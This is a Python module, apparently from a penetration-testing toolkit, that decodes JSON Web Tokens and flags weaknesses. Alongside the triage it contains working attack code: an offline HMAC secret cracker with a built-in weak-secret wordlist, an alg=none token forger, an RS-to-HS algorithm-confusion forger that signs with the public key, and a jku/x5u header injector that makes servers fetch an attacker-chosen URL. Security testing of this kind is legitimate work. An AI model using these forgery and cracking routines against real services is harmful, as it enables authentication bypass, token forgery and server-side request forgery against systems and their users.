"""JWT decoding & weakness triage (no signature verification).

Given a JWT, decode the header and claims and flag the well-known danger signs:
``alg: none``, a symmetric alg (HS256) that may be brute-forceable, missing
expiry, and already-expired / not-yet-valid tokens.  Pure parsing — sends no
traffic, so it is not scope-gated.
"""

from __future__ import annotations

import base64
import hashlib
import hmac
import json
from dataclasses import dataclass, field

_HS_ALGS = {"HS256": hashlib.sha256, "HS384": hashlib.sha384, "HS512": hashlib.sha512}

# A compact default weak-secret list for the offline HMAC crack (framework
# defaults + the usual suspects). Callers may pass a larger wordlist.
WEAK_JWT_SECRETS: list[str] = [
    "secret", "password", "changeme", "admin", "123456", "jwt", "token", "key",
    "your-256-bit-secret", "your_jwt_secret", "supersecret", "secretkey", "s3cr3t",
    "jwtsecret", "mysecret", "PleaseChangeMe", "private", "test", "dev", "qwerty",
    "letmein", "default", "0", "null", "password123", "root",
]


@dataclass
class JwtAnalysis:
    valid_structure: bool
    header: dict = field(default_factory=dict)
    payload: dict = field(default_factory=dict)
    algorithm: str | None = None
    issues: list[str] = field(default_factory=list)
    error: str | None = None


def _b64url_decode(segment: str) -> bytes:
    pad = "=" * (-len(segment) % 4)
    return base64.urlsafe_b64decode(segment + pad)


def _b64url_nopad(raw: bytes) -> str:
    return base64.urlsafe_b64encode(raw).rstrip(b"=").decode("ascii")


def crack_hmac_secret(token: str, wordlist: list[str] | None = None) -> str | None:
    """Offline brute of an HS256/384/512 JWT signing secret against a wordlist.

    Recomputes the HMAC over the signing input and constant-time-compares it to
    the token's signature; returns the secret on a match, else None. A recovered
    secret = the ability to forge ANY token. Sends no traffic."""

    token = token.strip()
    if token.lower().startswith("bearer "):
        token = token[7:].strip()
    parts = token.split(".")
    if len(parts) != 3 or not parts[2]:
        return None
    try:
        header = json.loads(_b64url_decode(parts[0]))
    except (ValueError, json.JSONDecodeError, UnicodeDecodeError):
        return None
    alg = header.get("alg") if isinstance(header, dict) else None
    if not isinstance(alg, str) or alg.upper() not in _HS_ALGS:
        return None
    digest = _HS_ALGS[alg.upper()]
    signing_input = f"{parts[0]}.{parts[1]}".encode()
    for secret in (wordlist or WEAK_JWT_SECRETS):
        sig = _b64url_nopad(hmac.new(secret.encode(), signing_input, digest).digest())
        if hmac.compare_digest(sig, parts[2]):
            return secret
    return None


def forge_alg_none(token: str) -> str:
    """Re-encode *token*'s payload under an ``alg:none`` header with an empty
    signature — the classic unverified-signature forgery, to test acceptance."""

    token = token.strip()
    if token.lower().startswith("bearer "):
        token = token[7:].strip()
    parts = token.split(".")
    payload_seg = parts[1] if len(parts) >= 2 else _b64url_nopad(b"{}")
    header_seg = _b64url_nopad(
        json.dumps({"alg": "none", "typ": "JWT"}, separators=(",", ":")).encode())
    return f"{header_seg}.{payload_seg}."


def forge_alg_confusion(token: str, public_key: str, *, alg: str = "HS256") -> str:
    """Re-sign *token* as HS256/384/512 using the RSA/EC **public key's exact PEM
    text** as the HMAC secret — the classic "verifier doesn't pin the algorithm
    family" bypass. If the server's JWT library accepts whatever `alg` the token
    declares and reuses the SAME key material to verify both RS*-signed and
    HS*-signed tokens, this forged token validates under the public key alone: a
    full forgery without ever touching the private key. Preserves the original
    header (e.g. `kid`, so a verifier that looks up key material by `kid` still
    resolves to the same public key) — only `alg` is flipped. Offline; the caller
    replays the forged token themselves."""

    token = token.strip()
    if token.lower().startswith("bearer "):
        token = token[7:].strip()
    parts = token.split(".")
    if len(parts) < 2:
        raise ValueError("not a JWT")
    alg_up = alg.upper()
    if alg_up not in _HS_ALGS:
        raise ValueError(f"unsupported HMAC algorithm {alg!r} (use HS256/HS384/HS512)")
    try:
        header = json.loads(_b64url_decode(parts[0]))
    except (ValueError, json.JSONDecodeError, UnicodeDecodeError):
        header = {}
    if not isinstance(header, dict):
        header = {}
    header = {**header, "alg": alg_up}
    header_seg = _b64url_nopad(json.dumps(header, separators=(",", ":")).encode())
    payload_seg = parts[1]
    signing_input = f"{header_seg}.{payload_seg}".encode()
    sig = _b64url_nopad(hmac.new(public_key.encode(), signing_input, _HS_ALGS[alg_up]).digest())
    return f"{header_seg}.{payload_seg}.{sig}"


def forge_remote_key_header(token: str, url: str, *, param: str = "jku") -> str:
    """Re-issue *token* with a ``jku``/``x5u`` header pointing at *url* (an OAST canary),
    keeping the original payload. A server that fetches the remote key material during
    verification calls back — proof of a key-injection / SSRF surface (CVE-2018-0114).
    Signature validity is irrelevant: the fetch happens before verification."""

    token = token.strip()
    if token.lower().startswith("bearer "):
        token = token[7:].strip()
    parts = token.split(".")
    if len(parts) < 2:
        raise ValueError("not a JWT")
    try:
        header = json.loads(_b64url_decode(parts[0]))
    except (ValueError, json.JSONDecodeError):
        header = {}
    if not isinstance(header, dict):
        header = {}
    header = {k: v for k, v in header.items() if k not in ("jku", "x5u")}
    header[param] = url
    header.setdefault("alg", "RS256")
    header_seg = _b64url_nopad(json.dumps(header, separators=(",", ":")).encode())
    sig = parts[2] if len(parts) >= 3 and parts[2] else "moonmcp"
    return f"{header_seg}.{parts[1]}.{sig}"


def analyze_jwt(token: str, now_epoch: int | None = None) -> JwtAnalysis:
    token = token.strip()
    if token.lower().startswith("bearer "):
        token = token[7:].strip()
    parts = token.split(".")
    if len(parts) not in (2, 3):
        return JwtAnalysis(valid_structure=False, error="not a JWT (expected 2 or 3 dot-separated parts)")
    try:
        header = json.loads(_b64url_decode(parts[0]))
        payload = json.loads(_b64url_decode(parts[1]))
    except (ValueError, json.JSONDecodeError, UnicodeDecodeError) as exc:
        return JwtAnalysis(valid_structure=False, error=f"undecodable segment: {exc}")

    if not isinstance(header, dict) or not isinstance(payload, dict):
        return JwtAnalysis(valid_structure=False,
                           error="header and payload must both be JSON objects")

    analysis = JwtAnalysis(valid_structure=True, header=header, payload=payload)
    # Only a string 'alg' is meaningful; null/number/missing => no algorithm.
    alg_raw = header.get("alg")
    alg = alg_raw if isinstance(alg_raw, str) and alg_raw else None
    analysis.algorithm = alg
    if alg is None:
        analysis.issues.append("no valid string 'alg' header")

    if alg and alg.lower() == "none":
        analysis.issues.append("CRITICAL: alg=none — signature is not verified; token forgeable")
    if alg and alg.upper().startswith("HS"):
        analysis.issues.append(f"{alg} is symmetric — vulnerable if the secret is weak/guessable (offline crack)")
    if len(parts) == 3 and parts[2] == "":
        analysis.issues.append("empty signature segment")
    if "exp" not in payload:
        analysis.issues.append("no 'exp' claim — token may never expire")
    if header.get("jku") or header.get("x5u"):
        analysis.issues.append("header references a remote key (jku/x5u) — potential key-injection (SSRF) surface")
    if header.get("kid"):
        analysis.issues.append("'kid' header present — check for path traversal / SQLi in key selection")

    if now_epoch is not None:
        exp = payload.get("exp")
        nbf = payload.get("nbf")
        if isinstance(exp, (int, float)) and exp < now_epoch:
            analysis.issues.append("token is EXPIRED")
        if isinstance(nbf, (int, float)) and nbf > now_epoch:
            analysis.issues.append("token is not yet valid (nbf in the future)")
    return analysis
